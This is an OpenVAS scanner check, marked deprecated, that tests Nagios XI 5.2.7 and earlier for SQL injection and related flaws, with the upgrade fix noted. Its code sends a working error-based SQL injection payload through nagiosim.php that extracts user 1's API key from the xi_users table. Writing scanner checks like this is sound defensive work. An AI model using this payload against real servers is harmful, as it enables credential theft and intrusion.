###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nagios_xi_multiple_vuln_jun16.nasl 11961 2018-10-18 10:49:40Z asteins $
#
# Nagios XI Multiple Vulnerabilities - June16
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:nagios:nagiosxi";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807835");
  script_version("$Revision: 11961 $");
  script_tag(name:"deprecated", value:TRUE);
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-18 12:49:40 +0200 (Thu, 18 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-06-08 16:38:53 +0530 (Wed, 08 Jun 2016)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Nagios XI Multiple Vulnerabilities - June16");

  script_tag(name:"summary", value:"This host is running Nagios XI and is
  prone to multiple vulnerabilities.

  This NVT has been replaced by NVT gb_nagios_xi_multiple_vulnerabilities_06_16.nasl
  (OID:1.3.6.1.4.1.25623.1.0.105749).");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Multiple errors are due to,

  - Insufficient sanitization of input passed via 'host' and 'service'
    GET parameters in the 'nagiosim.php' page.

  - Unescaped user input being passed to shell functions as an argument.

  - An insecure implementation of the application's component upload functionality.

  - An insecure implementation of the password reset functionality.

  - Multiple server-side request forgery vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to conduct command injection, gain elevated privileges, conduct
  server side request forgery attacks, conduct account hijacking and inject or
  manipulate SQL queries in the back-end database, allowing for the manipulation
  or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Nagios XI version 5.2.7 and prior.");

  script_tag(name:"solution", value:"Upgrade to Nagios XI version 5.2.8.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39899");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/137293");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Jun/9");
  script_xref(name:"URL", value:"http://www.security-assessment.com/files/documents/advisory/NagiosXI-Advisory.pdf");

  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_nagios_XI_detect.nasl");
  script_mandatory_keys("nagiosxi/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://www.nagios.com/products/nagios-xi");
  exit(0);
}

exit(66); ## This NVT is deprecated as addressed in
## gb_nagios_xi_multiple_vulnerabilities_06_16.nasl (OID:1.3.6.1.4.1.25623.1.0.105749)

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

if(dir == "/"){
  dir = "";
}

url = dir + "/includes/components/nagiosim/nagiosim.php?mode=resolve&host=a" +
            "&service=%27+AND+(SELECT+1+FROM(SELECT+COUNT(*),CONCAT(%27|API" +
            "KEY|%27,(SELECT+MID((IFNULL(CAST(backend_ticket+AS+CHAR),0x20)" +
            "),1,54)+FROM+xi_users+WHERE+user_id%3d1+LIMIT+0,1),%27|APIKEY|" +
            "%27,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+" +
            "GROUP+BY+x)a)+OR+%27";

if(http_vuln_check(port:http_port, url:url, check_header:FALSE,
               pattern:"SQL Error \[nagiosxi\]",
               extra_check:make_list("Duplicate entry", "APIKEY")))
{
  report = report_vuln_url(port:http_port, url:url);
  security_message(port:http_port, data:report);
  exit(0);
}
